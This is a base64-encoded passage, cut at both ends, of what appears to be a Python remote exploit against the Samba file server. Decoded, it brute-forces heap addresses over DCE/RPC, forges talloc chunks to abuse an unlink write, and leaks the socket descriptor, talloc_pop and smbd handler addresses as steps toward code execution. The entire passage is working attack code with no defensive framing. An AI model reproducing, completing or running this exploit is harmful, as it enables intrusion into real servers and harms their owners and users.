kZHJlc3MNCiAgICANCiAgICAjIG11c3QgYmUgaW52YWxpZCAocmVmcyBpcyBBY2NvdW50TmFtZS5BY3R1YWxDb3VudCkNCiAgICBzZXRfcGF5bG9hZCgnXHgwMCcqMTIgKyBwYWNrKCI8SSIsIGZsYWdfbG9vcCksIHBheWxvYWRfc2l6ZSkNCiAgICBpZiByZXF1ZXN0X2NoZWNrX3ZhbGlkX2FkZHIoYWRkci00KToNCiAgICAgICAgcHJpbnQoJyBbLV0gcmVxdWVzdF9jaGVja192YWxpZF9hZGRyKGFkZHItNCkgZmFpbGVkJykNCiAgICAgICAgcmV0dXJuIDANCiAgICAjIG11c3QgYmUgdmFsaWQgKHJlZnMgaXMgQWNjb3VudE5hbWUuT2Zmc2V0KQ0KICAgICMgZG8gY2hlY2sgYWdhaW4gaWYgZmFpbC4gc29tZXRpbWVzIGhlYXAgbGF5b3V0IGlzIGNoYW5nZWQNCiAgICBzZXRfcGF5bG9hZCgnXHgwMCcqOCArIHBhY2soIjxJIiwgZmxhZ19sb29wKSwgcGF5bG9hZF9zaXplKQ0KICAgIGlmIG5vdCByZXF1ZXN0X2NoZWNrX3ZhbGlkX2FkZHIoYWRkci04KSBhbmQgbm90IHJlcXVlc3RfY2hlY2tfdmFsaWRfYWRkcihhZGRyLTgpIDoNCiAgICAgICAgcHJpbnQoJyBbLV0gcmVxdWVzdF9jaGVja192YWxpZF9hZGRyKGFkZHItOCkgZmFpbGVkJykNCiAgICAgICAgcmV0dXJuIDANCiAgICAjIG11c3QgYmUgaW52YWxpZCAocmVmcyBpcyBBY2NvdW50TmFtZS5NYXhDb3VudCkNCiAgICBzZXRfcGF5bG9hZCgnXHgwMCcqNCArIHBhY2soIjxJIiwgZmxhZ19sb29wKSwgcGF5bG9hZF9zaXplKQ0KICAgIGlmIHJlcXVlc3RfY2hlY2tfdmFsaWRfYWRkcihhZGRyLTB4Yyk6DQogICAgICAgIHByaW50KCcgWy1dIHJlcXVlc3RfY2hlY2tfdmFsaWRfYWRkcihhZGRyLTB4YykgZmFpbGVkJykNCiAgICAgICAgcmV0dXJuIDANCiAgICAjIG11c3QgYmUgdmFsaWQgKHJlZnMgaXMgU2VydmVySGFuZGxlLkFjdHVhbENvdW50KQ0KICAgICMgZG8gY2hlY2sgYWdhaW4gaWYgZmFpbC4gc29tZXRpbWVzIGhlYXAgbGF5b3V0IGlzIGNoYW5nZWQNCiAgICBzZXRfcGF5bG9hZChwYWNrKCI8SSIsIGZsYWdfbG9vcCksIHBheWxvYWRfc2l6ZSkNCiAgICBpZiBub3QgcmVxdWVzdF9jaGVja192YWxpZF9hZGRyKGFkZHItMHgxMCkgYW5kIG5vdCByZXF1ZXN0X2NoZWNrX3ZhbGlkX2FkZHIoYWRkci0weDEwKToNCiAgICAgICAgcHJpbnQoJyBbLV0gcmVxdWVzdF9jaGVja192YWxpZF9hZGRyKGFkZHItMHgxMCkgZmFpbGVkJykNCiAgICAgICAgcmV0dXJuIDANCiAgICAgICAgDQogICAgcmV0dXJuIGFkZHINCg0KZGVmIGZpbmRfcGF5bG9hZF9hZGRyKHN0YXJ0X2FkZHIsIHN0YXJ0X3BheWxvYWRfc2l6ZSwgdGFyZ2V0X3BheWxvYWRfc2l6ZSk6DQogICAgcHJpbnQoJ1sqXSBicnV0ZWZvcmNpbmcgaGVhcCBhZGRyZXNzLi4uJykNCg0KICAgIHN0YXJ0X2FkZHIgPSBzdGFydF9hZGRyICYgMHhmZmZmMDAwMA0KICAgICAgICANCiAgICBoZWFwX2FkZHIgPSAwDQogICAgd2hpbGUgaGVhcF9hZGRyID09IDA6DQogICAgICAgICMgbG9vcCBmcm9tIG1heCB0byAweGI3NzAwMDAwIGZvciBmaW5kaW5nIGhlYXAgYXJlYQ0KICAgICAgICAjIG9mZnNldCAweDIwMDAwIGlzIG1pbmltdW0gb2Zmc2V0IGZyb20gaGVhcCBzdGFydCB0byByZWNpZXZlZCBkYXRhIGluIGhlYXANCiAgICAgICAgc3RvcF9hZGRyID0gMHhiNzcwMDAwMCArIDB4MjAwMDANCiAgICAgICAgZ29vZF9hZGRyID0gTm9uZQ0KICAgICAgICBwYXlsb2FkX3NpemUgPSBzdGFydF9wYXlsb2FkX3NpemUNCiAgICAgICAgd2hpbGUgcGF5bG9hZF9zaXplID49IHRhcmdldF9wYXlsb2FkX3NpemU6DQogICAgICAgICAgICBmb3JjZV9kY2VfZGlzY29ubmVjdCgpDQogICAgICAgICAgICBmb3VuZF9hZGRyID0gTm9uZQ0KICAgICAgICAgICAgZm9yIGkgaW4gcmFuZ2UoMyk6DQogICAgICAgICAgICAgICAgZm91bmRfYWRkciA9IGZpbmRfdmFsaWRfaGVhcF9hZGRyKHN0YXJ0X2FkZHIsIHN0b3BfYWRkciwgcGF5bG9hZF9zaXplLCBnb29kX2FkZHIgaXMgTm9uZSkNCiAgICAgICAgICAgICAgICBpZiBmb3VuZF9hZGRyIGlzIG5vdCBOb25lOg0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgaWYgZm91bmRfYWRkciBpcyBOb25lOg0KICAgICAgICAgICAgICAgICMgZmFpbGVkDQogICAgICAgICAgICAgICAgZ29vZF9hZGRyID0gTm9uZQ0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICBnb29kX2FkZHIgPSBmb3VuZF9hZGRyDQogICAgICAgICAgICBwcmludCgiIFsqXSBmb3VuZCB2YWxpZCBhZGRyICh7OmR9S0IpOiB7Onh9Ii5mb3JtYXQocGF5bG9hZF9zaXplLy8xMDI0LCBnb29kX2FkZHIpKQ0KICAgICAgICAgICAgc3RhcnRfYWRkciA9IGdvb2RfYWRkcg0KICAgICAgICAgICAgc3RvcF9hZGRyID0gZ29vZF9hZGRyIC0gcGF5bG9hZF9zaXplICsgMHgyMA0KICAgICAgICAgICAgcGF5bG9hZF9zaXplIC8vPSAyDQoNCiAgICAgICAgaWYgZ29vZF9hZGRyIGlzIG5vdCBOb25lOg0KICAgICAgICAgICAgIyB0cnkgMyB0aW1lcyB0byBmaW5kIGV4YWN0IGFkZHJlc3MuIGlmIGFkZHJlc3MgY2Fubm90IGJlIGZvdW5kLCBhc3N1bWUNCiAgICAgICAgICAgICMgbWluaW1pemluZyBwYXlsb2FkIHNpemUgaXMgbm90IGNvcnJlY3QuIHN0YXJ0IG1pbmltaXppbmcgYWdhaW4NCiAgICAgICAgICAgIGZvciBpIGluIHJhbmdlKDMpOg0KICAgICAgICAgICAgICAgIGhlYXBfYWRkciA9IGZpbmRfdmFsaWRfaGVhcF9leGFjdF9hZGRyKGdvb2RfYWRkciwgdGFyZ2V0X3BheWxvYWRfc2l6ZSkNCiAgICAgICAgICAgICAgICBpZiBoZWFwX2FkZHIgIT0gMDoNCiAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICBmb3JjZV9kY2VfZGlzY29ubmVjdCgpDQogICAgICAgIA0KICAgICAgICBpZiBoZWFwX2FkZHIgPT0gMDoNCiAgICAgICAgICAgIHByaW50KCcgWy1dIGZhaWxlZCB0byBmaW5kIHBheWxvYWQgYWRyZXNzJykNCiAgICAgICAgICAgICMgc3RhcnQgZnJvbSBsYXN0IGdvb2QgYWRkcmVzcyArIHNvbWUgb2Zmc2V0DQogICAgICAgICAgICBzdGFydF9hZGRyID0gKGdvb2RfYWRkciArIDB4MTAwMDApICYgMHhmZmZmMDAwMA0KICAgICAgICAgICAgcHJpbnQoJ1sqXSBicnV0ZWZvcmNpbmcgaGVhcCBhZHJlc3MgYWdhaW4gZnJvbSB7Onh9Jy5mb3JtYXQoc3RhcnRfYWRkcikpDQogICAgDQogICAgcGF5bG9hZF9hZGRyID0gaGVhcF9hZGRyIC0gbGVuKGZha2VfY2h1bmtfZmluZF9oZWFwKQ0KICAgIHByaW50KCIgWytdIGZvdW5kIHBheWxvYWQgYWRkcjogezp4fSIuZm9ybWF0KHBheWxvYWRfYWRkcikpDQogICAgcmV0dXJuIHBheWxvYWRfYWRkcg0KDQoNCiMjIyMjIyMjDQojIGxlYWsgaW5mbw0KIyMjIyMjIyMNCg0KZGVmIGFkZHIydXRmX3ByZWZpeChhZGRyKToNCiAgICBkZWYgaXNfYmFkY2hhcih2KToNCiAgICAgICAgcmV0dXJuICh2ID49IDB4ZDgpIGFuZCAodiA8PSAweGRmKQ0KICAgIA0KICAgIHByZWZpeCA9IDAgIyBzYWZlDQogICAgaWYgaXNfYmFkY2hhcigoYWRkcikmMHhmZikgb3IgaXNfYmFkY2hhcigoYWRkcj4+MTYpJjB4ZmYpOg0KICAgICAgICBwcmVmaXggfD0gMiAjIGNhbm5vdCBoYXZlIHByZWZpeA0KICAgIGlmIGlzX2JhZGNoYXIoKGFkZHI+PjgpJjB4ZmYpIG9yIGlzX2JhZGNoYXIoKGFkZHI+PjI0KSYweGZmKToNCiAgICAgICAgcHJlZml4IHw9IDEgIyBtdXN0IGhhdmUgcHJlZml4DQogICAgcmV0dXJuIHByZWZpeA0KICAgIA0KZGVmIGxlYWtfaW5mb191bmxpbmsocGF5bG9hZF9hZGRyLCBuZXh0X2FkZHIsIHByZXZfYWRkciwgcmV0cnk9VHJ1ZSwgY2FsbF9vbmx5PUZhbHNlKToNCiAgICAiIiINCiAgICBOb3RlOg0KICAgIC0gaWYgbmV4dF9hZGRyIGFuZCBwcmV2X2FkZHIgYXJlIG5vdCB6ZXJvLCB0aGV5IG11c3QgYmUgd3JpdGFibGUgYWRkcmVzcw0KICAgICAgYmVjYXVzZSBvZiBiZWxvdyBjb2RlIGluIF90YWxsb2NfZnJlZV9pbnRlcm5hbCgpDQogICAgICAgIGlmICh0Yy0+cHJldikgdGMtPnByZXYtPm5leHQgPSB0Yy0+bmV4dDsNCiAgICAgICAgaWYgKHRjLT5uZXh0KSB0Yy0+bmV4dC0+cHJldiA9IHRjLT5wcmV2Ow0KICAgICIiIg0KICAgICMgTm90ZTogVStEODAwIHRvIFUrREZGRiBpcyByZXNlcnZlZCAoYWxzbyBiYWQgY2hhciBmb3Igc2FtYmEpDQogICAgIyBjaGVjayBpZiAnXHgwMCcgaXMgbmVlZGVkIHRvIGF2b2lkIHV0ZjE2IGJhZGNoYXINCiAgICBwcmVmaXhfbGVuID0gYWRkcjJ1dGZfcHJlZml4KG5leHRfYWRkcikgfCBhZGRyMnV0Zl9wcmVmaXgocHJldl9hZGRyKQ0KICAgIGlmIHByZWZpeF9sZW4gPT0gMzoNCiAgICAgICAgcmV0dXJuIE5vbmUgIyBjYW5ub3QgYXZvaWQgYmFkY2hhcg0KICAgIGlmIHByZWZpeF9sZW4gPT0gMjoNCiAgICAgICAgcHJlZml4X2xlbiA9IDANCg0KICAgIGZha2VfY2h1bmtfbGVha19pbmZvID0gcGFjaygiPElJSUlJSUlJSUlJSSIsDQogICAgICAgIG5leHRfYWRkciwgcHJldl9hZGRyLCAjIG5leHQsIHByZXYNCiAgICAgICAgMCwgMCwgIyBwYXJlbnQsIGNoaWxkcmVuDQogICAgICAgIDAsIDAsICMgcmVmcywgZGVzdHJ1Y3Rvcg0KICAgICAgICAwLCAwLCAjIG5hbWUsIHNpemUNCiAgICAgICAgVEFMTE9DX01BR0lDIHwgVEFMTE9DX0ZMQUdfUE9PTCwgIyBmbGFnDQogICAgICAgIDAsIDAsIDAsICMgcG9vbCwgcGFkLCBwYWQNCiAgICAgICAgKQ0KICAgIHBheWxvYWQgPSAnXHgwMCcqcHJlZml4X2xlbitmYWtlX2NodW5rX2xlYWtfaW5mbyArIHBhY2soIjxJIiwgMHg4MDAwMCkgIyBwb29sX29iamVjdF9jb3VudA0KICAgIHNldF9wYXlsb2FkKHBheWxvYWQsIFRBUkdFVF9QQVlMT0FEX1NJWkUpDQogICAgaWYgY2FsbF9vbmx5Og0KICAgICAgICByZXR1cm4gY2FsbF9hZGRyKHBheWxvYWRfYWRkciArIFRBTExPQ19IRFJfU0laRSArIHByZWZpeF9sZW4pDQogICAgDQogICAgZm9yIGkgaW4gcmFuZ2UoMyBpZiByZXRyeSBlbHNlIDEpOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBhbnN3ZXJzID0gcmVxdWVzdF9hZGRyKHBheWxvYWRfYWRkciArIFRBTExPQ19IRFJfU0laRSArIHByZWZpeF9sZW4pDQogICAgICAgIGV4Y2VwdCBpbXBhY2tldC5kY2VycGMudjUucnBjcnQuRXhjZXB0aW9uOg0KICAgICAgICAgICAgcHJpbnQoImltcGFja2V0LmRjZXJwYy52NS5ycGNydC5FeGNlcHRpb24iKQ0KICAgICAgICAgICAgYW5zd2VycyA9IE5vbmUNCiAgICAgICAgICAgIGZvcmNlX2RjZV9kaXNjb25uZWN0KCkNCiAgICAgICAgaWYgYW5zd2VycyBpcyBub3QgTm9uZToNCiAgICAgICAgICAgICMgbGVhayBpbmZvIG11c3QgaGF2ZSBuZXh0IG9yIHByZXYgYWRkcmVzcw0KICAgICAgICAgICAgaWYgKGFuc3dlcnNbMV0gPT0gcHJldl9hZGRyKSBvciAoYW5zd2Vyc1swXSA9PSBuZXh0X2FkZHIpOg0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAjcHJpbnQoJ3s6eH0sIHs6eH0sIHs6eH0sIHs6eH0nLmZvcm1hdChhbnN3ZXJzWzBdLCBhbnN3ZXJzWzFdLCBhbnN3ZXJzWzJdLCBhbnN3ZXJzWzNdKSkNCiAgICAgICAgICAgIGFuc3dlcnMgPSBOb25lICMgbm8gbmV4dCBvciBwcmV2IGluIGFuc3dlcnMgPT4gd3JvbmcgYW5zd2VyDQogICAgICAgICAgICBmb3JjZV9kY2VfZGlzY29ubmVjdCgpICMgaGVhcCBpcyBjb3JydXB0ZWQsIGRpc2Nvbm5lY3QgaXQNCiAgICANCiAgICByZXR1cm4gYW5zd2Vycw0KICAgIA0KZGVmIGxlYWtfaW5mb19hZGRyKHBheWxvYWRfYWRkciwgcl9vdXRfYWRkciwgbGVha19hZGRyLCByZXRyeT1UcnVlKToNCiAgICAjIGxlYWsgYnkgcmVwbGFjZSByLT5vdXQucmV0dXJuX2F1dGhlbnRpY2F0b3IgcG9pbnRlcg0KICAgICMgTm90ZTogIGJlY2F1c2UgbGVha19hZGRyWzQ6OF0gd2lsbCBiZSByZXBsYWNlZCB3aXRoIHJfb3V0X2FkZHINCiAgICAjIG9ubHkgYW5zd2Vyc1swXSBhbmQgYW5zd2Vyc1syXSBhcmUgbGVha2VkDQogICAgcmV0dXJuIGxlYWtfaW5mb191bmxpbmsocGF5bG9hZF9hZGRyLCBsZWFrX2FkZHIsIHJfb3V0X2FkZHIsIHJldHJ5KQ0KDQpkZWYgbGVha19pbmZvX2FkZHIyKHBheWxvYWRfYWRkciwgcl9vdXRfYWRkciwgbGVha19hZGRyLCByZXRyeT1UcnVlKToNCiAgICAjIGxlYWsgYnkgcmVwbGFjZSByLT5vdXQucmV0dXJuX2F1dGhlbnRpY2F0b3IgcG9pbnRlcg0KICAgICMgTm90ZTogbGVha19hZGRyWzA6NF0gd2lsbCBiZSByZXBsYWNlZCB3aXRoIHJfb3V0X2FkZHINCiAgICAjIG9ubHkgYW5zd2Vyc1sxXSBhbmQgYW5zd2Vyc1syXSBhcmUgbGVha2VkDQogICAgcmV0dXJuIGxlYWtfaW5mb191bmxpbmsocGF5bG9hZF9hZGRyLCByX291dF9hZGRyLTQsIGxlYWtfYWRkci00LCByZXRyeSkNCg0KZGVmIGxlYWtfdWludDh0X2FkZHIocGF5bG9hZF9hZGRyLCByX291dF9hZGRyLCBjaHVua19hZGRyKToNCiAgICAjIGxlYWsgbmFtZSBmaWVsZCAoJ3VpbnQ4X3QnKSBpbiBmb3VuZCBoZWFwIGNodW5rDQogICAgIyBkbyBub3QgcmV0cnkgdGhpcyBsZWFrLCBiZWNhdXNlIHJfb3V0X2FkZHIgaXMgZ3Vlc3NlZA0KICAgIGFuc3dlcnMgPSBsZWFrX2luZm9fYWRkcihwYXlsb2FkX2FkZHIsIHJfb3V0X2FkZHIsIGNodW5rX2FkZHIgKyAweDE4LCBGYWxzZSkNCiAgICBpZiBhbnN3ZXJzIGlzIE5vbmU6DQogICAgICAgIHJldHVybiBOb25lDQogICAgaWYgYW5zd2Vyc1syXSAhPSBUQUxMT0NfTUFHSUM6DQogICAgICAgIGZvcmNlX2RjZV9kaXNjb25uZWN0KCkNCiAgICAgICAgcmV0dXJuIE5vbmUNCg0KICAgIHJldHVybiBhbnN3ZXJzWzBdDQoNCmRlZiBsZWFrX2luZm9fZmluZF9vZmZzZXQoaW5mbyk6DQogICAgIyBvZmZzZXQgZnJvbSBwb29sIHRvIHBheWxvYWQgc3RpbGwgZG9lcyBub3Qga25vdw0KICAgIHByaW50KCJbKl0gZ3Vlc3NpbmcgJ3InIG9mZnNldCBhbmQgbGVha2luZyAndWludDhfdCcgYWRkcmVzcyAuLi4iKQ0KICAgIGNodW5rX2FkZHIgPSBpbmZvWydjaHVua19hZGRyJ10NCiAgICB1aW50OHRfYWRkciA9IE5vbmUNCiAgICByX2FkZHIgPSBOb25lDQogICAgcl9vdXRfYWRkciA9IE5vbmUNCiAgICB3aGlsZSB1aW50OHRfYWRkciBpcyBOb25lOg0KICAgICAgICAjIDB4OGMxMCA8PSA0ICsgMHg3Zjg4ICsgMHgyMDQ0IC0gMHgxM2MwDQogICAgICAgICMgMHg5Y2UwIDw9IDQgKyAweDdmODggKyAweDEwZDAgKyAweDIwNDQgLSAweDEzYzANCiAgICAgICAgIyAweGFkYzggPD0gNCArIDB4N2Y4OCArIDB4MTBlOCArIDB4MTBkMCArIDB4MjA0NCAtIDB4MTNjMA0KICAgICAgICAjIDB4YWQ0MCBpcyBleHRyYSBvZmZzZXQgd2hlbiBubyBzaGFyZSBvbiBkZWJpYW4NCiAgICAgICAgIyAweDEwZDM4IGlzIGV4dHJhIG9mZnNldCB3aGVuIG9ubHkgW3ByaW50ZXJzXSBpcyBzaGFyZWQgb24gZGViaWFuDQogICAgICAgIGZvciBvZmZzZXQgaW4gKDB4OGMxMCwgMHg5Y2UwLCAweGFkYzgsIDB4YWQ0MCwgMHgxMGQzOCk6DQogICAgICAgICAgICByX2FkZHIgPSBjaHVua19hZGRyIC0gb2Zmc2V0DQogICAgICAgICAgICAjIDB4MTggaXMgb3V0LmF1dGhlbnRpY2F0b3Igb2Zmc2V0DQogICAgICAgICAgICByX291dF9hZGRyID0gcl9hZGRyICsgMHgxOA0KICAgICAgICAgICAgcHJpbnQoIiBbKl0gdHJ5ICdyJyBvZmZzZXQgMHh7Onh9LCByX291dCBhZGRyOiAweHs6eH0iLmZvcm1hdChvZmZzZXQsIHJfb3V0X2FkZHIpKQ0KICAgICAgICAgICAgDQogICAgICAgICAgICB1aW50OHRfYWRkciA9IGxlYWtfdWludDh0X2FkZHIoaW5mb1sncGF5bG9hZF9hZGRyJ10sIHJfb3V0X2FkZHIsIGNodW5rX2FkZHIpDQogICAgICAgICAgICBpZiB1aW50OHRfYWRkciBpcyBub3QgTm9uZToNCiAgICAgICAgICAgICAgICBwcmludCgiICBbKl0gc3VjY2VzcyIpDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIHByaW50KCIgIFstXSBmYWlsZWQiKQ0KICAgICAgICBpZiB1aW50OHRfYWRkciBpcyBOb25lOg0KICAgICAgICAgICAgcmV0dXJuIEZhbHNlDQogICAgDQogICAgaW5mb1sndWludDh0X2FkZHInXSA9IHVpbnQ4dF9hZGRyDQogICAgaW5mb1sncl9hZGRyJ10gPSByX2FkZHINCiAgICBpbmZvWydyX291dF9hZGRyJ10gPSByX291dF9hZGRyDQogICAgaW5mb1sncG9vbF9hZGRyJ10gPSByX2FkZHIgLSAweDEzYzANCiAgICANCiAgICBwcmludCgiIFsrXSB0ZXh0ICd1aW50OF90JyBhZGRyOiB7Onh9Ii5mb3JtYXQoaW5mb1sndWludDh0X2FkZHInXSkpDQogICAgcHJpbnQoIiBbK10gcG9vbCBhZGRyOiB7Onh9Ii5mb3JtYXQoaW5mb1sncG9vbF9hZGRyJ10pKQ0KICAgIA0KICAgIHJldHVybiBUcnVlDQogICAgDQpkZWYgbGVha19zb2NrX2ZkKGluZm8pOg0KICAgICMgbGVhayBzb2NrIGZkIGZyb20NCiAgICAjIHNtYl9yZXF1ZXN0LT5zY29ubi0+c29jaw0KICAgICMgICAob2Zmc2V0OiAtPjB4M2MgLT4weDAgKQ0KICAgIHByaW50KCJbKl0gbGVha2luZyBzb2NrZXQgZmQgLi4uIikNCiAgICBpbmZvWydzbWJfcmVxdWVzdF9hZGRyJ10gPSBpbmZvWydwb29sX2FkZHInXSsweDExYTANCiAgICBwcmludCgiIFsqXSBzbWIgcmVxdWVzdCBhZGRyOiB7Onh9Ii5mb3JtYXQoaW5mb1snc21iX3JlcXVlc3RfYWRkciddKSkNCiAgICBhbnN3ZXJzID0gbGVha19pbmZvX2FkZHIyKGluZm9bJ3BheWxvYWRfYWRkciddLCBpbmZvWydyX291dF9hZGRyJ10sIGluZm9bJ3NtYl9yZXF1ZXN0X2FkZHInXSsweDNjLTQpDQogICAgaWYgYW5zd2VycyBpcyBOb25lOg0KICAgICAgICBwcmludCgnIFstXSBjYW5ub3QgbGVhayBzY29ubl9hZGRyIGFkZHJlc3MgOignKQ0KICAgICAgICByZXR1cm4gTm9uZQ0KICAgIGZvcmNlX2RjZV9kaXNjb25uZWN0KCkgIyBoZWFwIGlzIGNvcnJ1cHRlZCwgZGlzY29ubmVjdCBpdA0KICAgIHNjb25uX2FkZHIgPSBhbnN3ZXJzWzJdDQogICAgaW5mb1snc2Nvbm5fYWRkciddID0gc2Nvbm5fYWRkcg0KICAgIHByaW50KCcgWytdIHNjb25uIGFkZHI6IHs6eH0nLmZvcm1hdChzY29ubl9hZGRyKSkNCiAgICANCiAgICAjIHdyaXRlIGluIHBhZGRpbmcgb2YgY2h1bmssIG5vIG5lZWQgdG8gZGlzY29ubmVjdA0KICAgIGFuc3dlcnMgPSBsZWFrX2luZm9fYWRkcjIoaW5mb1sncGF5bG9hZF9hZGRyJ10sIGluZm9bJ3Jfb3V0X2FkZHInXSwgc2Nvbm5fYWRkcikNCiAgICBpZiBhbnN3ZXJzIGlzIE5vbmU6DQogICAgICAgIHByaW50KCdjYW5ub3QgbGVhayBzb2NrX2ZkIGFkZHJlc3MgOignKQ0KICAgICAgICByZXR1cm4gTm9uZQ0KICAgIHNvY2tfZmQgPSBhbnN3ZXJzWzFdDQogICAgcHJpbnQoJyBbK10gc29jayBmZDogezpkfScuZm9ybWF0KHNvY2tfZmQpKQ0KICAgIGluZm9bJ3NvY2tfZmQnXSA9IHNvY2tfZmQNCiAgICByZXR1cm4gc29ja19mZA0KDQpkZWYgbGVha190YWxsb2NfcG9wX2FkZHIoaW5mbyk6DQogICAgIyBsZWFrIGRlc3RydWN0b3IgdGFsbG9jX3BvcCgpIGFkZHJlc3MNCiAgICAjIG92ZXJ3cml0ZSBuYW1lIGZpZWxkLCBubyBuZWVkIHRvIGRpc2Nvbm5lY3QNCiAgICBwcmludCgnWypdIGxlYWtpbmcgdGFsbG9jX3BvcCBhZGRyZXNzJykNCiAgICBhbnN3ZXJzID0gbGVha19pbmZvX2FkZHIoaW5mb1sncGF5bG9hZF9hZGRyJ10sIGluZm9bJ3Jfb3V0X2FkZHInXSwgaW5mb1sncG9vbF9hZGRyJ10gKyAweDE0KQ0KICAgIGlmIGFuc3dlcnMgaXMgTm9uZToNCiAgICAgICAgcHJpbnQoJyBbLV0gY2Fubm90IGxlYWsgdGFsbG9jX3BvcCgpIGFkZHJlc3MgOignKQ0KICAgICAgICByZXR1cm4gTm9uZQ0KICAgIGlmIGFuc3dlcnNbMl0gIT0gMHgyMDEwOiAjIGNodW5rIHNpemUgbXVzdCBiZSAweDIwMTANCiAgICAgICAgcHJpbnQoJyBbLV0gY2Fubm90IGxlYWsgdGFsbG9jX3BvcCgpIGFkZHJlc3MuIGFuc3dlcnNbMl0gaXMgd3JvbmcgOignKQ0KICAgICAgICByZXR1cm4gTm9uZQ0KICAgIHRhbGxvY19wb3BfYWRkciA9IGFuc3dlcnNbMF0NCiAgICBwcmludCgnIFsrXSB0YWxsb2NfcG9wIGFkZHI6IHs6eH0nLmZvcm1hdCh0YWxsb2NfcG9wX2FkZHIpKQ0KICAgIGluZm9bJ3RhbGxvY19wb3BfYWRkciddID0gdGFsbG9jX3BvcF9hZGRyDQogICAgcmV0dXJuIHRhbGxvY19wb3BfYWRkcg0KDQpkZWYgbGVha19zbWJkX3NlcnZlcl9jb25uZWN0aW9uX2hhbmRsZXJfYWRkcihpbmZvKToNCiAgICAjIGxlYWsgYWRkcmVzcyBmcm9tDQogICAgIyBzbWJkX3NlcnZlcl9jb25uZWN0aW9uLnNtYjEtPmZkZSAtPmhhbmRsZXINCiAgICAjICAgICAgIChvZmZzZXQ6ICAgICAgICAgICAgIC0+MHg5Yy0+MHgxNCApDQogICAgIyBNVVNUIE5PVCBkaXNjb25uZWN0IGFmdGVyIGdldHRpbmcgc21iMV9mZF9ldmVudCBhZGRyZXNzDQogICAgcHJpbnQoJ1sqXSBsZWFraW5nIHNtYmRfc2VydmVyX2Nvbm5lY3Rpb25faGFuZGxlciBhZGRyZXNzJykNCiAgICBkZWYgcmVhbF9sZWFrX2Nvbm5faGFuZGxlcl9hZGRyKGluZm8pOg0KICAgICAgICBhbnN3ZXJzID0gbGVha19pbmZvX2FkZHIyKGluZm9bJ3BheWxvYWRfYWRkciddLCBpbmZvWydyX291dF9hZGRyJ10sIGluZm9bJ3Njb25uX2FkZHInXSArIDB4OWMpDQogICAgICAgIGlmIGFuc3dlcnMgaXMgTm9uZToNCiAgICAgICAgICAgIHByaW50KCcgWy1dIGNhbm5vdCBsZWFrIHNtYjFfZmRfZXZlbnQgYWRkcmVzcyA6KCcpDQogICAgICAgICAgICByZXR1cm4gTm9uZQ0KICAgICAgICBzbWIxX2ZkX2V2ZW50X2FkZHIgPSBhbnN3ZXJzWzFdDQogICAgICAgIHByaW50KCcgWypdIHNtYjFfZmRfZXZlbnQgYWRkcjogezp4fScuZm9ybWF0KHNtYjFfZmRfZXZlbnRfYWRkcikpDQogICAgICAgIA0KICAgICAgICBhbnN3ZXJzID0gbGVha19pbmZvX2FkZHIoaW5mb1sncGF5bG9hZF9hZGRyJ10sIGluZm9bJ3Jfb3V0X2FkZHInXSwgc21iMV9mZF9ldmVudF9hZGRyKzB4MTQpDQogICAgICAgIGlmIGFuc3dlcnMgaXMgTm9uZToNCiAgICAgICAgICAgIHByaW50KCcgWy1dIGNhbm5vdCBsZWFrIHNtYmRfc2VydmVyX2Nvbm5lY3Rpb25faGFuZGxlciBhZGRyZXNzIDooJykNCiAgICAgICAgICAgIHJldHVybiBOb25lDQogICAgICAgIGZvcmNlX2RjZV9kaXNjb25uZWN0KCkgIyBoZWFwIGlzIGNvcnJ1cHRlZCwgZGlzY29ubmVjdCBpdA0KICAgICAgICBzbWJkX3NlcnZlcl9jb25uZWN0aW9uX2hhbmRsZXJfYWRkciA9IGFuc3dlcnNbMF0NCiAgICAgICAgZGlmZiA9IGluZm9bJ3RhbGxvY19wb3BfYWRkciddIC0gc21iZF9zZXJ2ZXJfY29ubmVjdGlvbl9oYW5kbGVyX2FkZHINCiAgICAgICAgaWYgZGlmZiA+IDB4MjAwMDAwMCBvciBkaWZmIDwgMDoNCiAgICAgICAgICAgIHByaW50KCcgWy1dIGdldCB3cm9uZyBzbWJkX3NlcnZlcl9jb25uZWN0aW9uX2hhbmRsZXIgYWRkcjogezp4fScuZm9ybWF0KHNtYmRfc2VydmVyX2Nvbm5lY3Rpb25faGFuZGxlcl9hZGRyKSkNCiAgICAgICAgICAgIHNtYmRfc2VydmVyX2Nvbm5lY3Rpb25faGFuZGxlcl9hZGRyID0gTm9uZQ0KICAgICAgICByZXR1cm4gc21iZF9zZXJ2ZXJfY29ubmVjdGlvbl9oYW5kbGVyX2FkZHINCiAgICANCiAgICBzbWJkX3NlcnZlcl9jb25uZWN0aW9uX2hhbmRsZXJfYWRkciA9IE5vbmUNCiAgICB3aGlsZSBzbWJkX3NlcnZlcl9jb25uZWN0aW9uX2hhbmRsZXJfYWRkciBpcyBOb25lOg0KICAgICAgICBzbWJkX3NlcnZlcl9jb25uZWN0aW9uX2hhbmRsZXJfYWRkciA9IHJlYWxfbGVha19jb25uX2hhbmRsZXJfYWRkcihpbmZvKQ0KICAgIA0KICAgIHByaW50KCcgWytdIHNtYmRfc2VydmVyX2Nvbm5lY3Rpb25faGFuZGxlciBhZGRyOiB7Onh9Jy5mb3JtYXQoc21iZF9zZXJ2ZXJfY29ubmVjdGlvbl9oYW5kbGVyX2FkZHIpKQ0KICAgIGluZm9bJ3NtYmRfc2VydmVyX2Nvbm5lY3Rpb25faGFuZGxlcl9hZGRyJ10gPSBzbWJkX3NlcnZlcl9jb25uZWN0aW9uX2hhbmRsZXJfYWRkcg0KICAgIA0KICAgIHJldHVybiBzbWJkX3NlcnZlcl9jb25uZWN0aW9uX2hhbmRsZXJfYWRkcg0KDQpkZWYgZmluZF9zbWJkX2Jhc2VfYWRkcihpbmZvKToNCiAgICAjIGVzdGltYXRlIHNtYmRfYWRkciBmcm9tIHRhbGxvY19wb3ANCiAgICBpZiAoaW5mb1sndGFsbG9jX3BvcF9hZGRyJ10gJiAweGYpICE9IDAgb3IgKGluZm9bJ3NtYmRfc2VydmVyX2Nvbm5lY3Rpb25faGFuZGxlcl9hZGRyJ10gJiAweGYpICE9IDA6DQogICAgICAgICMgY29kZSBoYXMgbm8gYWxpZ25tZW50DQogICAgICAgIHN0YXJ0X2FkZHIgPSBpbmZvWydzbWJkX3NlcnZlcl9jb25uZWN0aW9uX2hhbmRsZ